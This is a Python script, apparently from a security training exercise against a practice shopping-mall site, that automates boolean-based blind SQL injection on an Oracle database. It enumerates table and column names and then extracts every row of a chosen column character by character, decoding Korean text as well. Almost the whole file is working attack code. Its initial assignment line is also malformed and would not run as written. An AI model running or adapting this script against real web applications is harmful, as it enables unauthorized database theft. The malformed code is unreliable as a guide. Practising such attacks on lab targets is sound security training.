import requests

# 타켓시스템 shopping mall 1번 
url ="https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=61 and {}"

# 이진탐색 함수
def binarySearch(query):
    start = 1,end = 128
    max_end = end
    expened = True
    while start < end:
        mid = (start + end) // 2
        AttackQuery = f"({query}) > {mid}" 
        attackurl = url.format(AttackQuery)
        response = requests.get(attackurl)

        if '애플워치' in response.text:
            start = mid + 1 
        else: 
            end = mid 
        # 한글 데이터(ASCII 127 이상)를 추출하기 위해 범위 확장
        if start == end and end >= 128 and end >= max_end: 
            if expened: 
                end = 1000 
                expened = False 
            else: 
                end = end*10 
            max_end = end 
    return start



# 1. 테이블명 개수 
tableCount = binarySearch("select count(table_name) from user_tables")
print(f"테이블 개수: {tableCount}개")

# 2. 테이블명 
tableNames = []
for count in range(1, tableCount + 1):
    tableLength = binarySearch(f"select length(table_name) from (select table_name, rownum as ln from user_tables) where ln = {count}")
    tableName = ""
    for substr in range(1, tableLength + 1):
        asciiVal = binarySearch(f"select ascii(substr(table_name,{substr},1)) from (select table_name, rownum ln from user_tables) where ln = {count}")
        tableName += chr(asciiVal)
    tableNames.append(tableName)
    print(f"{count}번째 테이블명: {tableName}")

# 3. 테이블 선택
print("\n조회할 테이블을 선택하세요:")
for idx, name in enumerate(tableNames, start=1):
    print(f"{idx}. {name}")
selectedTableIdx = int(input("테이블 번호: ")) - 1
selectedTable = tableNames[selectedTableIdx]
print(f"선택된 테이블: {selectedTable}")

# 4. 컬럼 개수
columnCount = binarySearch(f"select count(column_name) from user_tab_columns where table_name='{selectedTable}'")
print(f"{selectedTable} 테이블의 컬럼 개수: {columnCount}")

# 5. 컬럼명
columnNames = []
for count in range(1, columnCount + 1):
    columnLength = binarySearch(f"select length(column_name) from (select column_name, rownum ln from user_tab_columns where table_name = '{selectedTable}') where ln = {count}")
    columnName = ""
    for substr in range(1, columnLength + 1):
        asciiVal = binarySearch(f"select ascii(substr(column_name,{substr},1)) from (select column_name, rownum ln from user_tab_columns where table_name = '{selectedTable}') where ln = {count}")
        columnName += chr(asciiVal)
    columnNames.append(columnName)
    print(f"{count}번째 컬럼명: {columnName}")

# 6. 컬럼 선택
print("\n조회할 컬럼을 선택하세요:")
for idx, name in enumerate(columnNames, start=1):
    print(f"{idx}. {name}")
selectedColumnIdx = int(input("컬럼 번호: ")) - 1
selectedColumn = columnNames[selectedColumnIdx]
print(f"선택된 컬럼: {selectedColumn}")


# 7. 데이터 개수 확인
dataCount = binarySearch(f"SELECT COUNT({selectedColumn}) FROM {selectedTable}")
print(f"{selectedTable} 테이블의 {selectedColumn} 컬럼 내 데이터 개수: {dataCount}")

# 8. 데이터 가져오기
for rowNum in range(1, dataCount + 1):
    dataLength = binarySearch(f"SELECT LENGTH({selectedColumn}) FROM (SELECT {selectedColumn}, ROWNUM AS ln FROM {selectedTable}) WHERE ln = {rowNum}")
    dataValue = ""
    for charPos in range(1, dataLength + 1):
        asciiVal = binarySearch(f"SELECT ASCII(SUBSTR({selectedColumn}, {charPos}, 1)) FROM (SELECT {selectedColumn}, ROWNUM AS ln FROM {selectedTable}) WHERE ln = {rowNum}")
        
        if(127<asciiVal):
            decimal_value = asciiVal

            hex_value = hex(decimal_value)[2:].upper() 

            bytes_value = bytes.fromhex(hex_value)
            decoded_char = bytes_value.decode("utf-8", errors="replace") 

            dataValue = dataValue+decoded_char

        else:
            dataValue += chr(asciiVal)

    print(f"{rowNum}번째 데이터: {dataValue}")